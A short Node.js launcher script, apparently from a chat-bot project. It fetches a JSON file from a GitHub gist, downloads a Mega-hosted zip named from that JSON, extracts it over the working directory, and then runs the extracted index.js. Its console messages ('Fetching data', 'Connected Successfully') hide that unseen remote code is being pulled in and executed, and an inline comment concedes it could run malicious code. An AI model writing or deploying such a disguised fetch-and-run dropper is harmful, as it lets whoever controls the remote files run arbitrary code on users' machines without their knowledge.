const fs = require("fs");
const path = require("path");
const { File } = require("megajs");
const AdmZip = require("adm-zip");
const axios = require("axios");

const downloadAndExtractMegaZip = (url) =>
  new Promise((resolve, reject) => {
    try {
      console.log("Downloading Files...");
      const file = File.fromURL(url);
      const outputPath = path.join(process.cwd(), "plugins.zip");
      file.download((err, data) => {
        if (err) return reject(err);
        fs.writeFileSync(outputPath, data);
        const zip = new AdmZip(outputPath);
        zip.extractAllTo(process.cwd(), true);
        fs.unlinkSync(outputPath);
        console.log("Connected Successfully");
        resolve();
      });
    } catch (err) {
      reject(err);
    }
  });

const main = async () => {
  try {
    console.log("Fetching data...");
    const { data } = await axios.get(
      "https://gist.githubusercontent.com/gojosathory2/9008aadfdd8d412d58d0a983a4b34f5f/raw/36ce196f53e8a650e1f3700381c7491416c02bf0/Pakgaya.json"
    );
    await downloadAndExtractMegaZip(data.mega);
    console.log("Executing...");
    require("./index.js"); // Warning: This could execute malicious code
  } catch (err) {
    console.error("Error:", err.message);
  }
};

main();
